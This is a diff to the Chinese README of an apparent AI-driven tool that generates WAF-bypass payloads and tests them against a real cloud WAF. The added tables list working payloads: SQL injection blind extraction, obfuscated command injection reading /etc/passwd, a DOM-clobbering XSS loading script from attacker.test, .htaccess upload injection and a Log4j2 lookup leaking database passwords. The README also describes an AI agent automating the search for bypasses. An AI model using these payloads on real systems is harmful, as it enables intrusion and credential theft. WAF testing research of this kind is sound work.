@@ -24,7 +24,7 @@ WAF 正从传统规则引擎向语义引擎演进。在命令注入、SQL 注入
 /semantic-mining <scenario> [--batches N] [--focus <direction_id>]
 ```
 
-1. **生成**（AI 智力密集）：从知识库 144 原语 + 上一轮数据选方向，每条 payload 必须带「机制 + 理由」（WAF 看到 X，解析器做 Y → 为什么能绕）
+1. **生成**（AI 智力密集）：从知识库 **216 原语** + 上一轮数据选方向，每条 payload 必须带「机制 + 理由」（WAF 看到 X，解析器做 Y → 为什么能绕）
 2. **执行 + 学习**（机械）：入库去重 → Layer2 模板派生变体 → 远程实测 → 回写维度统计
 3. **变强检查**（主动）：自动检测知识缺口（全拦 / 停滞 / KB 覆盖不足），主动申请联网检索扩充知识库
 4. **汇报 + 询问**：每批输出摘要 + 推荐下一方向，永不默默停下
@@ -33,8 +33,12 @@ WAF 正从传统规则引擎向语义引擎演进。在命令注入、SQL 注入
 
 - 按原语聚合实测通过率，分档：**confirmed（≥60%）/ boundary / dead（=0%）**
 - 熵优先选择下一方向（`info = p(1-p)`），有效维度被深挖、无效维度被剪枝
-- **同义近义迭代**：对成功样本做同义替换派生新表达（`AND→&&`、`=→LIKE`、`FROM` 均 100% 确认）
-- X-WAF-UUID 追踪，检测 WAF 规则升级并触发重基线
+- **同义近义迭代**：对成功样本做同义替换派生新表达（`AND→&&`、`=→LIKE`、`FROM`，实测通过率统计入库，不标 100%）
+- **结构新颖性优先**：`lib/structures.py` 每轮输出结构覆盖报告，设计目标锁定零通过/低覆盖结构，禁止只深化已 confirmed
+- **语句合成器**：`lib/composer.py` 从「语句骨架 × 语法部件」结构性生成全新语句（`GET_LOCK`/`TABLE`/`CTE`/`HANDLER`），解耦新颖性与手写种子
+- **种子策展**：`curate_seeds.py` 把通过样本按结构类提炼进 `knowledge/seeds.jsonl`，进化种子库
+- **CMDi 语法门禁**：远程源站不执行命令，`bash -n` 本地校验后再实测，剔除无效载荷
+- X-WAF-UUID 追踪，检测 WAF 规则升级并触发重基线复验
 
 ### 知识库
 
@@ -65,34 +69,39 @@ python3 platform/server.py --port 8787    # http://127.0.0.1:8787
 
 ---
 
-## 📊 样本成果（已确认样本集）
+## 📊 样本成果（实测通过样本库）
 
-> 口径：样本库**只保留远程实测通过**（HTTP 200 = WAF 放行）的样本，已确认绕过率 100%。
+> 口径：样本库为 **AI 生成 → 远程实测全量记录**（HTTP 200 = WAF 放行 / 403 = 拦截）。**绕过率按实测计算，非 100%**——每个样本都是真实请求，被拦的也如实入库。
 
 | 指标 | 值 |
 |---|---|
-| 已确认样本 | **205**（唯一 payload 180） |
-| 场景分布 | sqli 191 · cmdi 13 · log4j2 1 |
-| 已确认技法 | 3（`AND→&&` / `=→LIKE` / `FROM` 同义替换，100%） |
-| 实测环境 | 真实云 WAF（远程，200=放行 / 403=拦截） |
+| 样本库总量 | **5,295**（已通过 2,050 · 被拦截 3,245） |
+| 整体绕过率 | **≈39%**（2,050/5,295，历史累计口径） |
+| 场景通过分布 | sqli 1,610 · cmdi 399 · upload 28 · xss 7（验证中）· log4j2 6（验证中） |
+| 已确认技法 | **18**（confirmed ≥60% 通过率，跨 5 场景） |
+| 知识库原语 | **216** |
+| 实测环境 | 真实腾讯云 WAF（远程，200=放行 / 403=拦截） |
 
-**有效技法示例（真实通过云 WAF）**：
+**本轮有效技法（真实通过云 WAF）**：
 
-| 技法 | 原语 | 示例 |
+| 技法 | 结构/原语 | 示例 |
 |------|------|------|
-| 关键字双重写 | `gen:double_write` | `1 UNIONunion SELECT 1,2,3` |
-| 引号拆分 | `gen:quote_split` | `1 UN'ION SELECT 1,2,3` |
-| 版本注释 × 拆分 | `gen:version_comment` | `1 /*!50000UN'ION*/ SELECT 1,2,3` |
-| 空白替换 × 拆分 | `gen:whitespace_sub` | `1%a0UN'ION SELECT 1,2,3` |
-| CMDi glob | `cmdi:syntactic:glob` | `;/???/passwd` |
-| Log4j2 非 JNDI lookup | `log4j2:lookup:info_disclosure` | `${bundle:application:spring.datasource.password}` |
+| CASE WHEN × REGEXP 布尔盲注 | 函数布尔盲注（原零通过，破 54 变体） | `1 AND CASE WHEN (SELECT flag FROM flags LIMIT 1) REGEXP 0x5e66 THEN 1 ELSE 2 END=1` |
+| 引号拆分族 | `gen:quote_split_all`（64% confirmed） | `1 A'ND CA'SE WH'EN (SEL'ECT ...)` |
+| 关键字双重写 | `gen:double_write_all`（56% boundary） | `1 ANDand CASEcase WHENwhen ...` |
+| CMDi 参数展开 | 环境变量/空参（原零通过，破 10 变体） | `:;true && c'at${PATH:0:1}etc${PATH:0:1}passwd` |
+| CMDi ANSI-C 引号 | `cmdi:lexical:ansi_c_quoting` | `$'\143\141\164' $'\057\145\164\143\057\160\141\163\163\167\144'` |
+| XSS DOM clobbering | xss 首个通过向量（3 变体） | `<img name="currentScript" src="https://attacker.test/evil.js">` |
+| Upload 配置注入 | .htaccess / user.ini（43% 通过） | `AddType application/x-httpd-php .png` |
+| Log4j2 非 JNDI 泄露 | `log4j2:lookup:info_disclosure` | `${bundle:application:spring.datasource.password}` |
 
 **关键洞察**：
 
-1. **SQLi 是主突破口**：同义替换类原语（词法层不触发关键字连续匹配）是云 WAF 的明确盲区；双写/引号拆分靠"打断连续匹配"有效。
-2. **XSS 内容层全面被拦**：mXSS、JS 混淆、冷门标签事件全拦——云 WAF 对 XSS 语义层检测强。
-3. **Log4j2 非 JNDI 突破**：`${jndi:...}` 各类混淆全拦，但 `${bundle:...}` ResourceBundle 信息泄露 lookup 通过——WAF 只盯 jndi/ldap 关键字，漏了真实攻击面。
-4. **WAF 差异巨大**：本地 CRS PL4 上 100% 通过的技法在云 WAF 上可能 0%，必须逐个从零画边界。
+1. **语义引擎对"形态完整"攻击检测强、对"零脚本语法"失手**：SQLi 结构、XSS 标签事件、JNDI 全混淆家族都被语义化覆盖；但**无任何脚本语法的 gadget（DOM clobber `<img name=currentScript>`）和配置指令（.htaccess/user.ini）是明确盲区**。
+2. **词法拆分是最通用杠杆**：双写/引号拆分/反斜杠在 sqli 与 cmdi 双场景互验，靠"打断关键字连续匹配"稳定突破。
+3. **Log4j2 检出强但单向**：JNDI 13 类混淆（rmi/dns/iiop/哈希片段/无点ı/lower/嵌套）全拦，但 `${bundle:}`/`${env:}` 非 JNDI 泄露全放行——信息泄露面是结构性缺口。
+4. **绕过率是画出来的，不是标出来的**：云 WAF 总体拦截强（整体 38%），突破集中在边界结构；已确认技法与"样本通过"严格区分，杜绝"100% 通过"式失真。
+5. **基线稳定**：WAF 规则更新（X-WAF-UUID 变更）后复验代表样本 17/17 仍通过。
 
 ---
 
@@ -118,19 +127,22 @@ curl "http://localhost:8090/sqli/level1.php?id=1+UNION+SELECT+1,2,3"   # → 403
 ├── .claude/skills/semantic-mining/   # ★ 语义挖掘 Skill（自包含，可独立使用）
 │   ├── SKILL.md                      #   4 步循环工作流
 │   ├── lib/                          #   schema / 生成器 / 远程执行器 / 学习分析
-│   ├── knowledge/                    #   知识库 + 已确认技法 + 同义词表
+│   │   ├── composer.py               #     语句合成器（结构性生成新语句）
+│   │   └── structures.py             #     攻击结构分类 / 覆盖报告 / 新颖性缺口
+│   ├── knowledge/                    #   知识库(216原语) + 已确认技法 + 种子库
 │   ├── corpus/                       #   样本库 samples.jsonl + 测试事件 tests.jsonl
-│   ├── scripts/                      #   run_round.py 一轮机械循环
+│   ├── scripts/                      #   run_round.py 一轮循环 / curate_seeds.py 种子策展
+│   ├── rounds/                       #   各轮探针与结果记录
 │   └── targets/                      #   目标环境配置
-├── platform/                         # 样本平台（waf-cli + Flask 仪表盘）
+├── platform/                         # 样本平台（waf-cli + Flask 只读仪表盘）
 │   ├── cli.py                        #   命令行入口
-│   ├── server.py                     #   Flask 仪表盘
-│   └── pflib/                        #   storage / runner / report
+│   ├── server.py                     #   Flask 仪表盘（总览/样本库/详情/知识库/状态）
+│   └── pflib/                        #   storage / report
 ├── app/                              # 本地靶场 PHP 应用（SQLi/CMDi/Upload/XSS/Log4j2）
 ├── app-log4j/                        # Log4j2 实验应用
 ├── waf/                              # ModSecurity CRS PL4 配置
 ├── db/                               # MySQL 初始化
-├── samples/                          # 目标定义 / 编码配方 / 归档
+├── samples/                          # 目标定义 / 归档（移除样本历史数据不入库）
 └── docker-compose.yml                # 本地靶场编排
 ```
 
